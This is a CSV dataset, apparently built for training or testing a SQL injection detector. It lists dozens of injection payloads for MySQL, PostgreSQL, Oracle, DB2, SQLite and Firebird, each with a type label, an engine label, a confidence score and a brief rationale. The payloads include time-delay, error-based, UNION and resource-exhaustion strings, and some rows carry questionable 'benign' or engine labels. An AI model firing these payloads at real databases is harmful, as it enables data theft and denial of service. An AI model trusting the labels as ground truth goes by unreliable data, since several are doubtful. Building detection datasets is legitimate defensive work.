id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
21682,"1%"" ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.95,extractvalue() is MySQL XPath error; malformed path triggers data leak,3
21683,"1' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",heavy_query,postgresql,0.85,regexp_substring(repeat(..., 5000000)) PostgreSQL DoS via huge string repetition,2
21684,"1"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""hmun"" = ""hmun",heavy_query,postgresql,0.85,regexp_substring(repeat(..., 5000000)) PostgreSQL DoS via huge string repetition,2
21685,"1%' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.90,benchmark() is MySQL CPU-based time delay; MD5 hashing creates latency,2
21686,-8625 or 3176 = 2519# fvgl,boolean_blind,generic,0.65,AND/OR equality; payload controls boolean branch execution path,2
21687,"1',iif ( 9496 = 4153,1,1/0 )",benign,mssql,0.65,IIF() conditional function is generic SQL; not attack signal,2
21688,"1' where 6963 = 6963 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,postgresql,0.85,regexp_substring(repeat(..., 5000000)) PostgreSQL DoS via huge string repetition,2
21689,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",heavy_query,db2,0.85,Multiple sysibm.systables joins + count() is DB2 Cartesian DoS,2
21690,1' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'mptm' = 'mptm,boolean_blind,postgresql,0.70,CAST to numeric type with CASE WHEN branches in PostgreSQL,2
21691,"1"" ) ) as jucs where 6836 = 6836",benign,generic,0.65,WHERE equality clause alone is not injection; standard SQL structure,1
21692,"1%"" ) ) rlike sleep ( 5 ) and ( ( ""%"" = """,time_blind,mysql,0.90,sleep() is MySQL time-based blind; rlike context triggers delay,2
21693,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",heavy_query,db2,0.85,Multiple sysibm.systables joins + count() is DB2 Cartesian DoS,2
21694,"end and ( ( ( ""memh"" like ""memh",benign,generic,0.60,no SQLi signal in heuristic check; standard SQL structure,0
21695,"1"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ""qfhv"" = ""qfhv",boolean_blind,mysql,0.80,RLIKE regex pattern matching; true/false branch based on regex match,2
21696,-9553 ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 5299 = 5299,out_of_band,oracle,0.75,dbms_utility function call is Oracle; can be side-channel via error,1
21697,"1"" and 4595 = 4595#",boolean_blind,generic,0.65,AND equality; payload controls boolean branch execution path,2
21698,1 ) where 2083 = 2083,benign,generic,0.65,WHERE equality clause alone is not injection; standard SQL structure,1
21699,"1"" ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""ctzh"" = ""ctzh",heavy_query,generic,0.70,Multiple system table joins + count() creates Cartesian explosion,1
21700,"1"" ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( ""obau"" = ""obau",error_based,mysql,0.95,extractvalue() is MySQL XPath error; malformed path triggers data leak,2
21701,"1 ) as kqas where 7302 = 7302 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.85,generate_series(1, 5000000) is PostgreSQL DoS; Cartesian expansion,2
21702,"1'+ ( select papc where 8900 = 8900 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.85,elt(condition, sleep()) branches MySQL time delay in true condition path,2
21703,"1%"" ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.85,Multiple all_users joins + count() is Oracle Cartesian DoS,2
21704,"-6158"" ) ) ) or 8571 = 8571--",boolean_blind,generic,0.65,AND/OR equality; payload controls boolean branch execution path,2
21705,"1' ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'pbqg' = 'pbqg",heavy_query,postgresql,0.85,regexp_substring(repeat(..., 5000000)) PostgreSQL DoS via huge string repetition,2
21706,"1"" ) as sstd where 9629 = 9629 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",error_based,mysql,0.95,updatexml() is MySQL XPath error; invalid replacement triggers error leak,2
21707,"1'+ ( select 'ycvl' where 8415 = 8415 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,postgresql,0.85,regexp_substring(repeat(..., 5000000)) PostgreSQL DoS via huge string repetition,2
21708,"1%' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( '%' = '",heavy_query,postgresql,0.85,regexp_substring(repeat(..., 5000000)) PostgreSQL DoS via huge string repetition,2
21709,1 or 6793 = ( select 6793 from pg_sleep ( 5 ) ),time_blind,postgresql,0.95,pg_sleep() is PostgreSQL time-based; select from pg_sleep triggers delay,3
21710,"1%"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""%"" = """,heavy_query,sqlite,0.85,randomblob(500000000) creates DoS via large blob generation in SQLite,2
21711,"-5560"" ) ) or 7292 = 6184#",boolean_blind,generic,0.65,AND/OR equality; payload controls boolean branch execution path,2
21712,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'gsup' = 'gsup",heavy_query,postgresql,0.85,regexp_substring(repeat(..., 5000000)) PostgreSQL DoS via huge string repetition,2
21713,"-3013' ) where 2027 = 2027 union all select 2027,2027,2027,2027--",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21714,"1"" ) or sleep ( 5 ) #",time_blind,mysql,0.95,sleep() is MySQL time-based blind; condition triggers sleep in query branch,3
21715,"1'+ ( select qjng where 1897 = 1897 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) +'",heavy_query,firebird,0.85,rdb$fields table joins + count() is Firebird Cartesian DoS,2
21716,1 ) ) as eigk where 2557 = 2557,benign,generic,0.65,WHERE equality clause alone is not injection; standard SQL structure,1
21717,1'|| ( select 'gbyh' from dual where 5889 = 5889 order by 1#,boolean_blind,oracle,0.70,ORDER BY clause is valid SQL; WHERE equality is not direct attack,2
21718,"1 ) ) as rqbo where 2243 = 2243 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",error_based,mysql,0.85,EXP() function overflow is MySQL error-based; negation causes arithmetic error,2
21719,"1 ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",boolean_blind,generic,0.65,CASE WHEN branches execute different SQL paths based on condition,1
21720,"1%"" ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""%"" = """,error_based,mysql,0.85,EXP() function overflow is MySQL error-based; negation causes arithmetic error,2
21721,"1' in boolean mode ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) #",heavy_query,sqlite,0.85,randomblob(500000000) creates DoS via large blob generation in SQLite,2
21722,"1"" ) ) as tpeh where 6306 = 6306 and 5965 = 5806#",boolean_blind,generic,0.65,AND equality; payload controls boolean branch execution path,2
21723,"1' where 1272 = 1272 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,0.95,dbms_pipe.receive_message() is Oracle time-based; pauses execution for N seconds,3
21724,-7072' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),error_based,oracle,0.95,xmltype() cast error is Oracle error-based; invalid XML triggers error,3
21725,"-5288' ) or make_set ( 1164 = 1710,1710 ) and ( 'pkwy' = 'pkwy",benign,mysql,0.65,MAKE_SET() function is valid MySQL; not a direct SQLi signal,1
21726,1'+ ( select 'tjvt' where 2463 = 2463,benign,generic,0.65,WHERE equality clause alone is not injection; standard SQL structure,1
21727,"1 ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",heavy_query,sqlite,0.85,randomblob(500000000) creates DoS via large blob generation in SQLite,2
21728,"1' ) ) as ijyi where 3694 = 3694 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",heavy_query,postgresql,0.85,regexp_substring(repeat(..., 5000000)) PostgreSQL DoS via huge string repetition,2
21729,1%' ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( '%' = ',time_blind,postgresql,0.95,pg_sleep() is PostgreSQL time-based; select from pg_sleep triggers delay,3
21730,1%' ) ) or sleep ( 5 ) and ( ( '%' = ',time_blind,mysql,0.95,sleep() is MySQL time-based blind; condition triggers sleep in query branch,3
21731,"1"" ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""fuus"" like ""fuus",out_of_band,oracle,0.75,dbms_utility function call is Oracle; can be side-channel via error,1
21732,"1"" ) and 2954 = 1256--",boolean_blind,generic,0.65,AND equality; payload controls boolean branch execution path,2
21733,"-3587' ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'psqt' like 'psqt",error_based,oracle,0.95,ctxsys.drithsx.sn() Oracle error function; triggers indexing error with data,3
21734,"1' in boolean mode ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) #",heavy_query,mysql,0.85,IF() subquery with large constants creates conditional Cartesian payload,2
21735,"-7347"" ) ) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21736,"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'xikz' like 'xikz",heavy_query,sqlite,0.85,randomblob(500000000) creates DoS via large blob generation in SQLite,2
21737,"1 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",error_based,mysql,0.95,extractvalue() is MySQL XPath error; malformed path triggers data leak,3
21738,"1' ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'vpus' = 'vpus",error_based,mysql,0.95,extractvalue() is MySQL XPath error; malformed path triggers data leak,2
21739,"1%"" ) ) ) and ( 3502 = 7893 ) *7893 and ( ( ( ""%"" = """,benign,generic,0.60,no SQLi signal in heuristic check; standard SQL structure,1
21740,"1"" ) ) union all select null,null,null,null#",union_based,generic,0.90,UNION ALL SELECT pattern indicates data exfiltration via column alignment,3
21741,"1' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'ewwi' = 'ewwi",heavy_query,oracle,0.85,Multiple all_users joins + count() is Oracle Cartesian DoS,2
